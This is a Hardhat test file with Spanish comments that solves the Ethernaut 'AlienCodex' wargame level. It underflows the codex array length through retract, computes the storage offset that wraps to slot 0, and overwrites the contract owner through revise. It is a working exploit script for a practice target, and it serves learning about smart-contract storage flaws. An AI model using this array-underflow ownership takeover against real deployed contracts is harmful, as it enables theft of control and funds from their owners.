import { expect } from "chai";
import { ethers } from "hardhat";
import { BigNumber, Contract, Signer } from "ethers";
import { createChallenge, submitLevel } from "./utils";
import { Interface } from "ethers/lib/utils";

let accounts: Signer[];
let eoa: Signer;
let attacker: Contract;
let challenge: Contract;
const LEVEL_ADDRESS = "0xda5b3Fb76C78b6EdEE6BE8F11a1c31EcfB02b272";
const INSTANCIA_DEL_NIVEL: string = "0xa1553Bd7D78Fd5AE03370092afF964f60A713b22";

before(async () => {
  accounts = await ethers.getSigners();
  [eoa] = accounts;
  // Contrato del challenge
  const challengeFactory = await ethers.getContractFactory(`AlienCodex`);
  if (INSTANCIA_DEL_NIVEL.length > 1) {
    challenge = challengeFactory.attach(INSTANCIA_DEL_NIVEL);
    console.log(`INSTANCIA CONTRATO CHALLENGE UTILIZADA DESDE:`, challenge.address);
  }
  else {
    const challengeAddress = await createChallenge(LEVEL_ADDRESS);
    challenge = challengeFactory.attach(challengeAddress);
    console.log(`CONTRATO CHALLENGE DEPLOYADO EN:`, challenge.address);
  }

  // Contrato atacante (Si fuera necesario)
  // const attackerFactory = await ethers.getContractFactory(`GateAttacker`);
  // attacker = await attackerFactory.deploy(challenge.address);
  // await attacker.deployed();
  // console.log(`CONTRATO ATACANTE DEPLOYADO EN:`, attacker.address);
});

describe("AlienCodex challenge", async()=> {
  it("Resuelve el challenge - AlienCodex", async()=>{
    let posInicioCodex = BigNumber.from(ethers.utils.keccak256("0x0000000000000000000000000000000000000000000000000000000000000001"));
    let tamanioTotalStorage = BigNumber.from(2).pow(256);
    let offsetParaLlegarAOwner = BigNumber.from(tamanioTotalStorage).sub(posInicioCodex);
    let myAddress = await eoa.getAddress();

    //Cambiamos el valor de contact para pasar el modifier
    let txHacerContacto = await challenge.make_contact();
    await txHacerContacto.wait();

    //Estiramos el storage del codex por overflow para poder llegar al owner
    let txAgrandarCodexPorOverflow = await challenge.retract();
    await txAgrandarCodexPorOverflow.wait();

    //Sobreescribimos el owner con nuestra address, enganchada con 12 ceros por delante para cumplir la restricción de ser bytes32 como pide la función.
    let txCambiarOwner = await challenge.revise(offsetParaLlegarAOwner, ethers.utils.zeroPad(myAddress,32));
    await txCambiarOwner.wait();

    expect(await challenge.owner(),"OWNER NO ALTERADO").to.equal(myAddress);
  })
});

after(async () => {
  expect(await submitLevel(challenge.address), "DESAFÍO INCOMPLETO").to.be.true;
});

//Notas:
//El storage al inicio del challenge se encuentra en el siguiente estado
//    owner es una address -> 20 bytes ----------------------> entra en slot 0 ----> slot 0 pasa a tener de 32 bytes libres, a solo 12.
//    contact es un bool -> 1 byte --------------------------> entra en slot 0 ----> slot 0 pasa a tener de 12 bytes libres, a solo 11.
//    codex es un array de bytes32 -> 32 bytes por registro -> no entra en slot 0 -> se lo coloca en el slot 1. 